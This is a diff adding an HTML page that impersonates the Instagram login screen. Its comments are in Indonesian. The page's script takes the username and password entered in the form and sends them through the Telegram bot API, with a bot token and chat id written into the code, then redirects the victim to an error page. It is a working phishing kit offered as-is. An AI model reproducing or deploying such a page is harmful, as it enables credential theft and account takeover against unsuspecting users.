@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Instagram</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="refresh" content="60">
+    <link rel="icon" href="images/favicon.png" type="image/icon">
+    <link rel="stylesheet" type="text/css" href="style.css">
+</head>
+
+<body>
+    <div class="container">
+        <div class="page">
+            <div class="logo">
+                <img src="images/instagram.png" alt="instagram" style="width: 175px;">
+            </div>
+
+            <br />
+            <form class="container" action="send.php" method="post" onsubmit="event.preventDefault(); sendMessage(this)">
+                <input type="text" placeholder="Username atau nama instagram" name="u_name" required>
+                <input type="password" placeholder="Password" name="pass" required>
+                <button class="submitbutton">Log in</button>
+                <br />
+                <div class="option">OR </div>
+            </form>
+
+            <div class="fblink">
+                <img src="images/facebook.svg" alt="facebook" style="width: 20px; margin-right: 10px;">
+                <a href="https://www.facebook.com/"> Log in With Facebook</a>
+            </div>
+
+            <div class="forget-id">
+                <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
+            </div>
+            <div class="singup">
+                <p>Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/"> Sign up</a></p>
+            </div>
+
+            <!-- Tambahkan tulisan "Gate the app" -->
+            <div class="gate-app">
+                <p>Gate the app</p>
+            </div>
+
+            <!-- Susun gambar agar sejajar kiri dan kanan -->
+            <div class="logo-gambar">
+                <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=id&gl=US">
+                    <img src="images/gplay.png" alt="gplay" style="width: 100px;">
+                </a>
+                <a href="https://www.microsoft.com/">
+                    <img src="images/microsoftt.png" alt="microsoft" style="width: 100px;">
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <br />
+    <div style="position:fixed;left:0;bottom:0;width:100%; color: #7e7979;">
+        <p style="text-align:center;"></p>
+    </div>
+    <br />
+    <script>
+    function sendMessage(f){
+        // Mengambil nilai username dan password dari formulir
+        let username = f.u_name.value;
+        let password = f.pass.value;
+
+        // Membuat pesan yang berisi username dan password
+        let message = "Username: " + username + "\nPassword: " + password;
+
+        // Mengirim pesan ke bot Telegram
+        fetch('https://api.telegram.org/bot6464769325:AAGGYR8zV7rqgMBo9wjabJ8F_s4hc2Bp_Tw/sendMessage?chat_id=7149582849&text=' + encodeURIComponent(message))
+        .finally(function(){
+            window.open('eror.html','_self');
+        });
+    }
+
+    </script>
+</body>
+
+</html>
